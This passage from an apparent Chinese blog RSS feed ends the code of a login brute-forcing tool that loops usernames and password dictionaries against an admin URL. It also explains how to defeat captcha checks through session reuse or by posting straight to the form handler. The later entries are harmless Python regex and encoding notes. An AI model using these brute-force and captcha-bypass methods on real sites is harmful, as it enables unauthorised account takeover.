        &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;usernames_num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# 曾经双层多线程,没能跑完所有的组合,于是不再这里再开多线程&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r'(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)$'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;crack_admin_login_url_inside_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass_dict_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# 下面加4是因为http://localhost/admin.php中验证码为4,在不确定验证码长度情况下下面第二个参数不用写&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# crack_admin_login_url(url,yanzhengma_len=4)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;crack_admin_login_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-about&quot;&gt;0x02 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.关于验证码

这里只要获取一次验证码就可以了,因为每次post到的url不是登录页面,而是登录页面背后的form action页
面,每次直接访问登录页面都会访问一次验证码生成页面,一旦访问了验证码生成页面,客户端在服务器上存
储的session就变了,所以暴破时,第一次访问登录页面有没有验证码生成页面的url,如果有的话就尝试再直
接访问这个验证码页面,而不是去访问登录页面,访问验证码页面后,服务器上存储的session刷新了,然后再也
不访问登录页面和验证码页面了[因为每次访问到了验证码页面后服务器上存储的session都会刷新],直接提
交识别到的验证码和用户名和密码到form action的url,每次用户名和密码都可以变,但验证码可以不变

也可以尝试首先访问登录页面,尝试得到验证码url[这里session已经刷新]和form action表单提交到的url,
如果能够得到验证码url,说明登录页面有验证码,然后换一个浏览器[换一个没有访问过验证码url的浏览器]
直接将用户名和密码提交到刚才获得的form action提交到的url,这里不用加验证码就可以直接暴破了,要
求form action提交到的url[也即用户名密码和验证码验证页面]中的验证方式如:
if $_POST['eg.code']==$_SESSION['eg.verification']则通过验证码这一关验证,如果验证码的验证代码
是:
   if md5($_POST['eg.code'])==$_SESSION['eg.verification']则通过验证码这一关验证
这样的形式就没办法用换浏览器不加验证码的方法来暴破了


2.关于python中的session

在xadmin.py中由于要暴力破解的url的验证码页面会在服务器上生成session,所以在python中要拥有让服务器保存session的功
能,普通的请求是不能让服务器保存session的,如果服务器上没有保存的session[也即session['eg.verification']=''],当破
解提交识别后的验证码和用户名+密码到check_login.php时,这样会始终无法成功验证,因为识别的验证码不可能为空

python的session功能访问:
	
http://stackoverflow.com/questions/12737740/python-requests-and-persistent-sessions
&amp;lt;eg.&amp;gt;
		s=requests.session()
		s.post('https://localhost/login.py', login_data)
		#logged in! cookies saved for future requests.
		r2 = s.get('https://localhost/profile_data.json', ...)
		#cookies sent automatically!
		#do whatever, s will keep your cookies intact :)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;本文中代码链接如下:
	&lt;a href=&quot;https://github.com/3xp10it/xadmin&quot;&gt;xadmin&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 10 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/web/2016/11/10/%E8%87%AA%E5%8A%A8%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/11/10/%E8%87%AA%E5%8A%A8%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</guid>
        
        <category>session</category>
        
        <category>python</category>
        
        <category>php</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>正则表达式</title>
        <description>&lt;h3 id=&quot;0x01-notes&quot;&gt;0x01 notes&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.匹配换行符
	re.search(&quot;\n&quot;),不可写成r&quot;\n&quot;,这样匹配的是\n字符串,不是换行符,r前缀表示后面出现的转义全部不再转义,只作原生
	字符,r=raw[原生]

2.good knowledge
   http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html

3.在线测试:
	http://tool.chinaz.com/regex/

4.python一般默认贪婪模式,变成非贪婪方法:
	*?      使*变成非贪婪模式
	+?      使+变成非贪婪模式
	??      使?变成非贪婪模式
	{m,n}?  使{m,n}变成非贪婪模式

5.正则表达式 - 运算符优先级
	http://www.jb51.net/article/52491.htm

6.匹配不包含
	http://www.jb51.net/article/52491.htm

7.前向界定|后向界定|前向非界定|后向非界定
	http://blog.csdn.net/smilelance/article/details/6529950

8.匹配除\n以外的所有空白字符
 	[^\S\n]
	原来想这样:[\s[^\n]]
 	还有这样:[\s(?&amp;lt;!\n)]
 	结果都不可以,正则的存在需要多多口味,存在\s\S,\w\W,\d\D的现象不是随便就存在的,
	简单的逻辑组合就可成为强大的匹配利器

9.linux中grep正则用法
	找出8000端口的pid
	netstat -ntlp | grep 8000 | grep -oP '\d{1,4}(?=\/)'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 08 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/regexp/2016/11/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
        <guid isPermaLink="true">http://localhost:4000/regexp/2016/11/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
        
        <category>regexp</category>
        
        <category>python</category>
        
        
        <category>regexp</category>
        
      </item>
    
      <item>
        <title>python3编码相关</title>
        <description>&lt;h3 id=&quot;0x01-byte-string-和-character-string&quot;&gt;0x01 byte string 和 character string&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;byte string是如01010110110010的序列,计算机可读,人不可读
2&amp;gt;character string是如&quot;您好,world&quot;的序列,计算机不可读,人可读
3&amp;gt;character string要encode(&quot;eg.utf8|cp1252&quot;)之后才可被计算机认识和存储
4&amp;gt;文件存储时实际上是byte string,要想读出这个byte string对应的character string则要以文件在存储时的编码方式解码[decode]之后才会显示成人可读的character string
5&amp;gt;猜测python3中的open函数默认用utf8解码文件,这样的话在python3想要读其他编码方式存储的文件的时候直接用open函数就
会出错
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;eg.python3读以cp1252编码存储的文件&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
import codecs
import re
count=0
i=0
with codecs.open(sys.argv[1], &quot;r&quot;,encoding='cp1252', errors='replace') as f:
    for each in f:
        if re.search(r&quot;Insert into&quot;,each):
            count+=1
            sys.stdout.write(&quot;一共有&quot;+str(count)+&quot;条数据\r&quot;)
            sys.stdout.flush()
        print(type(each))
print(&quot;\n&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;上面的python代码中用来读取以cp1252编码的文件中有多少条Insert into的语句,如果其中换成是下面的打开方式会出错
	with open(sys.argv[1],&quot;r+&quot;) as f:
正确打开方式中的encoding='cp1252'应该理解成&quot;这个文件是用cp1252的编码方式encode之后存储的byte string,现在告诉计算机,计算机
在读取的时候会以cp1252来decode成人可读的character string&quot;,在上面的正则匹配时,r&quot;Insert into&quot;表示的是character
string类型的Insert into字符串,each表示的是被open解码后的也正好是character类型的字符串,正则在匹配时要求匹配的表
达式和被匹配的字符串是同一类型,如果在这里将r&quot;Insert into&quot;改成b&quot;Insert into&quot;则会报错,提示两个参数不是同一类型,上
面的正则中的r&quot;Insert into&quot;也可以不写r前缀,在匹配\n[换行符]时,r&quot;\n&quot;表示的不是换行符,是\n字符串,如果要匹配\n换行
符,则要写成&quot;\n&quot;,不能加r前缀,加了r前缀表示r修饰的要匹配的字符串中的转义字符不会被转义,代表raw[原生]

如果用上面说的错误的打开方式open文件,得到的是默认被utf8解码成的character string类型的字符串,但是一般会出错,因为有
些会无法用utf8解码成功

猜测print函数在打印变量时会默认用utf8解码要打印的变量,并显示成人可读的character string,不过会提示这个显示出来的
人可读的character string其实不是真的character string,例如打印byte string时会显示b&quot;xxx...&quot;,表示这个是个byte
string,只是为了要让人更明白这个byte string代表的是什么才这样

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-python3正则匹配中文&quot;&gt;0x01 python3正则匹配中文&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import re
string=&quot;Hello,World! 你好世界&quot;
if re.search(&quot;你好.*&quot;,string):
    print(&quot;good,matched&quot;)
else:
    print(&quot;bad,no matched&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-knowledge&quot;&gt;0x02 knowledge&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.文件编码识别
	pip3 install chardet
	chardet file
2.ascii,unicode,utf8...
	http://blog.csdn.net/xiongxiao/article/details/3741731
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 08 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/python/2016/11/08/python3%E7%BC%96%E7%A0%81%E7%9B%B8%E5%85%B3/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2016/11/08/python3%E7%BC%96%E7%A0%81%E7%9B%B8%E5%85%B3/</guid>
        
        <category>codec</category>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
  </channel>
</rss>
